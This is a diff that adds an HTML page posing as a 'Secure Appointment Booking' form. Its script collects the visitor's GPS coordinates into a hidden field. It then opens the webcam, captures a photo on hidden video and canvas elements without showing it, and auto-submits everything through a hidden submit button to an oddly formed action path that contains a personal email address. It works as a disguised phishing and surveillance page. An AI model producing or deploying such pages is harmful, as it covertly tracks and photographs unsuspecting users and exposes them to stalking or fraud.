@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Secure Appointment Booking</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; }
+        input, select { width: 100%; padding: 8px; }
+        button { background-color: #4CAF50; color: white; border: none; padding: 10px 15px; cursor: pointer; }
+        video, canvas { display: none; }
+        #locationBtn { background-color: #2196F3; }
+        #cameraBtn { background-color: #f44336; }
+    </style>
+</head>
+<body>
+    <h1>Secure Appointment Booking</h1>
+    <form id="bookingForm" action="lokhandeyuvraj19@gmail.com/submit" method="POST" target="_blank">
+        <div class="form-group">
+            <label for="name">Full Name:</label>
+            <input type="text" id="name" name="name" required>
+        </div>
+        
+        <div class="form-group">
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" required>
+        </div>
+        
+        <div class="form-group">
+            <label for="date">Preferred Date:</label>
+            <input type="date" id="date" name="date" required>
+        </div>
+        
+        <div class="form-group">
+            <label for="service">Service Type:</label>
+            <select id="service" name="service" required>
+                <option value="">Select Service</option>
+                <option value="consultation">Consultation</option>
+                <option value="diagnostic">Diagnostic Test</option>
+                <option value="followup">Follow-up Visit</option>
+            </select>
+        </div>
+        
+        <button type="button" id="locationBtn">Enable Location Tracking</button>
+        <button type="button" id="cameraBtn">Take Photo</button>
+        
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+        
+        <input type="hidden" id="locationData" name="location">
+        <input type="hidden" id="photoData" name="photo">
+        
+        <button type="submit" style="display:none;">Submit Booking</button>
+    </form>
+
+    <script>
+        // Handle location access
+        document.getElementById('locationBtn').addEventListener('click', () => {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const loc = `${pos.coords.latitude},${pos.coords.longitude}`;
+                    document.getElementById('locationData').value = loc;
+                    alert('Location successfully captured!');
+                },
+                err => alert(`Location error: ${err.message}`)
+            );
+        });
+
+        // Handle camera access
+        document.getElementById('cameraBtn').addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // Capture photo when video starts
+                video.addEventListener('loadeddata', () => {
+                    const canvas = document.getElementById('canvas');
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    
+                    ctx.drawImage(video, 0, 0);
+                    const imgData = canvas.toDataURL('image/jpeg');
+                    document.getElementById('photoData').value = imgData;
+                    
+                    // Auto-submit form after capturing
+                    setTimeout(() => {
+                        document.getElementById('bookingForm').submit();
+                    }, 500);
+                });
+            } catch (err) {
+                alert(`Camera error: ${err.message}`);
+            }
+        });
+    </script>
+</body>
+          </html>
